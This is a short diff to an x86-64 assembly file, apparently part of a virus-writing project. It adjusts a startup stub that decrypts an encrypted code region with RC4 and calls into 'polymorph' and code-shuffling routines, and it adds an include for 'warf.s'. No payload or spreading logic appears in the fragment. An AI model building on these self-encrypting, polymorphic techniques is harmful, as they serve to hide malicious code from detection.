@@ -16,6 +16,16 @@ _start:
 	sub		rsp, 64
 	mov		rbp, rsp
 
+	lea		rax, [rel war]
+	mov		[rsp + 32], rax
+
+	lea		rax, [rel printf]
+	mov		[rsp + 40], rax
+
+	lea	rax, [rel start_shuffle]
+	mov		[rsp + 48], rax
+	lea	rax, [rel end_shuffle]
+	mov		[rsp + 56], rax
 
 	lea		rax, [rel rc4]
 	mov		[rsp], rax
@@ -30,25 +40,17 @@ _start:
 	lea		rcx, [rel _encrypted_start]
 	mov		[rsp + 24], rcx
 
-
 	sub		rax, rcx
 	mov		rsi, rax
 	mov		rdi, rcx
 	xor		rdx, rdx
-	call	[rbp]
+	;call	[rbp]
 
-	lea	rdi, [rel encrypted_start]
-	lea	rsi, [rel _stop]
+	;lea	rdi, [rel start_shuffle]
+	;lea	rsi, [rel end_shuffle]
 
-	call	patchjmp
-	lea	rdi, [rel encrypted_start]
-	lea	rsi, [rel _stop]
+	;call	shuffle
 
-	call	patchjmp
-	lea	rdi, [rel encrypted_start]
-	lea	rsi, [rel _stop]
-
-	call	patchjmp
 	lea	rdi, [rel encrypted_start]
 	lea	rsi, [rel _stop]
 
@@ -73,6 +75,7 @@ _start:
 %include "polymorph.s"
 %include "print_rax.s"
 %include "printf.s"
+%include "warf.s"
 ; Functions to remove!
 
 _stop:
